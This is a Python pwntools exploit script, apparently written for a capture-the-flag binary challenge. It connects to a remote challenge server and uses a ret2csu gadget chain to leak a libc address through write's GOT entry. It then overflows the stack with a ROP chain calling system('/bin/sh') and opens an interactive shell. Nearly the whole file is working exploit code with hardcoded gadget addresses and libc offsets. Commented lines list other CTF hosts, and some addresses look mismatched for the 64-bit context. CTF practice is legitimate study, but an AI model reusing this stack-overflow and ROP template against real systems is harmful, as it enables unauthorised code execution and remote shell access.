# import time
from pwn import *
# from LibcSearcher import *
# from ctypes import *

# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 9999)
# io = remote("192.168.170.128", 1234)
io = remote("node5.anna.nssctf.cn", 28686)
# elf = ELF('./nss-ret2csu')

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("112.6.51.212", 30969)
# io = remote("8.130.35.16", 51006)
# io = process('./question_5_plus_x64')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# libc = ELF('./libc.so.6')


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r():
    return (io.recv())


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def print_addr(name, addr):
    print(f"{name} =", addr)


context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

elf = ELF('./look')

padding = 0x6C + 4
csu2 = 0x4013B0
csu1 = 0x4013C6
bss_addr = 0x804A140
write_got = elf.got['write']
read_got = elf.got['read']
ret_to_addr = 0x8048561
pop_rdi = 0x4012b3
ret = 0x40101a

def csu(fuct_got, a1, a2, a3, padding, ret_to_addr):
    payload = b'a' * padding
    payload += p64(csu1) + p64(0) + p64(1)  # rbx + rbp
    payload += p64(a1) + p64(a2) + p64(a3) + p64(fuct_got)  #r12 + r13 + r14 + r15
    payload += p64(csu2)    #ret
    payload += b'a' * (7 * 8)
    payload += p64(ret_to_addr)
    return payload

sla(b'nput', csu(write_got, 1, write_got, 8, padding, ret_to_addr))
ru("Ok.\n")
libc_base = u64(io.recv(6).ljust(0x8, b"\x00")) - 0x114a20
print(hex(libc_base))
system_addr = libc_base + 0x050D60
bin_sh = libc_base + 0x1D8698
# sla("nput:", csu(read_got, 0, bss_addr, 16, padding, dofuction_addr)) #输入 /bin/sh 到bss段，当然也可以直接用libc中的/bin/sh
# sl('/bin/sh')
ru(b'nput:')
s(b'a' * 0x108 + p64(ret) + p64(pop_rdi)+ p64(bin_sh) + p64(system_addr))
inter()


# csu1 = 0x00000000004012AA #在ida找
# csu2 = 0x0000000000401290 #在ida找
# return_addr = 0x40117A    #vuln函数的地址
#
# rbx=0
# rbp=1
# r12=1           #arg1
# r13=write_got   #arg2
# r14=8           #arg3
# r15=write_got   #call r15
#
# payload  = b'a'* padding
# payload += flat([csu1 , rbx , rbp , r12 , r13 , r14 , r15 , csu2])
# payload +=  b'a' * (7 * 8) + p64(return_addr)
